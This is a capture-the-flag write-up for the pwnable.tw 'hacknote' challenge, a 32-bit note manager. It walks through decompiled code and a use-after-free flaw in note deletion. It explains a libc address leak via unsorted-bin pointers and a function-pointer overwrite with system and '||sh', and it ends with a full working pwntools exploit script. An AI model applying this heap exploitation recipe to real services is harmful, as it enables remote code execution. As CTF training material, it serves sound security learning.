# Challenge Description
## File type
```bash
$ file hacknote
hacknote: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
```

## Binary Protection
```bash
$ checksec hacknote
[*] './hacknote'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
```

## Background
- `hacknote` gives us 4 operations to manage our notes:
	- Create a new note
	- Delete an existed note
	- Print a note
	- Exit the program

```bash
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :20
Content :abc
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :3
Index :0
abc

---------------------- HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :0
Success
```

- The program saves all notes into a global array of pointer (`noteStorage` var) which has length of 5. We will explore first 3 operations:
	- Operation 1: `addNote()` function
	```c
	unsigned int addNote()
	{
		int v0; // ebx
		int v2; // [esp-Ch] [ebp-34h]
		int v3; // [esp-Ch] [ebp-34h]
		int v4; // [esp-8h] [ebp-30h]
		int v5; // [esp-8h] [ebp-30h]
		int v6; // [esp-4h] [ebp-2Ch]
		int i; // [esp+Ch] [ebp-1Ch]
		int size; // [esp+10h] [ebp-18h]
		char buffer[8]; // [esp+14h] [ebp-14h] BYREF
		unsigned int canary; // [esp+1Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		if ( globalIndex <= 5 )
		{
			for ( i = 0; i <= 4; ++i )
			{
				if ( !noteStorage[i] )
				{
					noteStorage[i] = malloc(8);
					if ( !noteStorage[i] )
					{
						puts("Alloca Error");
						exit(-1, v2, v4, v6);
					}
					*(_DWORD *)noteStorage[i] = printVal;
					printf("Note size :");
					read(0, buffer, 8);
					size = atoi(buffer);
					v0 = noteStorage[i];
					*(_DWORD *)(v0 + 4) = malloc(size);
					if ( !*(_DWORD *)(noteStorage[i] + 4) )
					{
						puts("Alloca Error");
						exit(-1, v3, v5, v6);
					}
					printf("Content :");
					read(0, *(_DWORD *)(noteStorage[i] + 4), size);
					puts("Success !");
					++globalIndex;
					return __readgsdword(0x14u) ^ canary;
				}
			}
		}
		else
		{
			puts("Full");
		}
		return __readgsdword(0x14u) ^ canary;
	}
	```

	- Operation 2: `deleteNote()` function
	```c
	unsigned int deleteNote()
	{
		int v1; // [esp-Ch] [ebp-24h]
		int v2; // [esp-8h] [ebp-20h]
		int v3; // [esp-4h] [ebp-1Ch]
		int index; // [esp+4h] [ebp-14h]
		char buffer[4]; // [esp+8h] [ebp-10h] BYREF
		unsigned int canary; // [esp+Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		printf("Index :");
		read(0, buffer, 4);
		index = atoi(buffer);
		if ( index < 0 || index >= globalIndex )
		{
			puts("Out of bound!");
			_exit(0, v1, v2, v3);
		}
		if ( noteStorage[index] )
		{
			free(*(_DWORD *)(noteStorage[index] + 4));
			free(noteStorage[index]);
			puts("Success");
		}
		return __readgsdword(0x14u) ^ canary;
	}
	```

	- Operation 3: `printNote()` function
	```c
	unsigned int printNote()
	{
		int v1; // [esp-Ch] [ebp-24h]
		int v2; // [esp-8h] [ebp-20h]
		int v3; // [esp-4h] [ebp-1Ch]
		int index; // [esp+4h] [ebp-14h]
		char buffer[4]; // [esp+8h] [ebp-10h] BYREF
		unsigned int canary; // [esp+Ch] [ebp-Ch]

		canary = __readgsdword(0x14u);
		printf("Index :");
		read(0, buffer, 4);
		index = atoi(buffer);
		if ( index < 0 || index >= globalIndex )
		{
			puts("Out of bound!");
			_exit(0, v1, v2, v3);
		}
		if ( noteStorage[index] )
			(*(void (__cdecl **)(int))noteStorage[index])(noteStorage[index]); // call printVal() function
		return __readgsdword(0x14u) ^ canary;
	}
	```

- The structure of a 'note' memory on heap includes the address of `printVal()` function and a memory address that stores the content of note.

# Vulnerability
- In `deleteNote()` function, after free note, it doesn't set that pointer in `noteStorage` array to `NULL`:
```c
if ( noteStorage[index] )
{
	free(*(_DWORD *)(noteStorage[index] + 4));
	free(noteStorage[index]);
	puts("Success");
}
```
This leads to **use-after-free** vulnerability.

# Exploitation
## Leak Libc
- Since it allows to print the content of note, I came up with an idea that use unsorted bins to leak the address of main arena.
- First, I created 2 notes; one to get the address of main arena, one to prevent the chunk of the first one from merging into top chunk. Then I deleted the first note and added a new one which has the same size of content as the first one.
- When a chunk is put into unsorted bin, its `fd` and `bk` pointer must point back to the list head which lives inside `main_arena` struct in libc. It still remains after that chunk is allocated again.
- Therefore, I just needed to print the content of the third note to get that address, so that I calculated the libc base address
```python
addNote(0x400, b"abc")
addNote(0x500, b"abc")
deleteNote(0)
addNote(0x400, b"b")
printNote(2)
target.recv(4)
offset_1b07b0 = u32(target.recv(4))
libc.address = offset_1b07b0 - 0x1b07b0
```

## Get Shell
- After having libc base address, it's trivial to calculate the address of `system` function.
```python
system_addr = libc.symbols['system']
```

- Now we have to find where to write the address of `system` function and get shell. After analyzing, I decided to write it into first 4 bytes of note memory which contains the address of `printVal` function.
- To do that, I freed chunk of the second and the third note. Since size of chunk of these notes is the same and it is 8 bytes, if we allocate a new note with size of the content is 8, we will do arbitrary write to one of these 2 chunks so that we can change the address of `printVal` to the address of `system` function.
- However, when print note operation happens, it calls `printVal` function with the argument is that note pointer. If we change to `system`, it will call `system(noteStorage[i])` and what `system` try to execute is `\xf7\xf3...` which represents the exact address of `system` function. This command obviously cannot be run. Therefore, to get shell, or execute `sh` command in other words, I put `||` operation between the address of `system` and command `sh`. This makes `system` function run `\xf7\xf3...||sh` which will execute `sh` when the first command is fail and it always gets shell because the first command never can be run successfully.

## Exploit Code
```python
from pwn import *
import utils

context.terminal = "kitty"
context.log_level = "debug"
context.arch = "i386"

TARGET = "./bin/hacknote"
LIBC = "./lib/libc_32.so.6"

target = process(TARGET)
target = remote("chall.pwnable.tw", 10102)
# gdb.attach(target, gdbscript="b *0x8048a33")

exe = ELF(TARGET)
libc = ELF(LIBC)

def addNote(size: int, content: bytes):
	target.sendafter(b"Your choice :", b"1")
	target.sendafter(b"Note size :", str(size).encode())
	target.sendafter(b"Content :", content)

def deleteNote(index: int):
	target.sendafter(b"Your choice :", b"2")
	target.sendafter(b"Index :", str(index).encode())

def printNote(index: int):
	target.sendafter(b"Your choice :", b"3")
	target.sendafter(b"Index :", str(index).encode())

addNote(0x400, b"abc")
addNote(0x500, b"abc")
deleteNote(0)
addNote(0x400, b"b")
printNote(2)
target.recv(4)
offset_1b07b0 = u32(target.recv(4))
libc.address = offset_1b07b0 - 0x1b07b0
system_addr = libc.symbols['system']
deleteNote(1)
deleteNote(2)
addNote(8, p32(system_addr) + b"||sh")
printNote(1)

target.interactive()
```
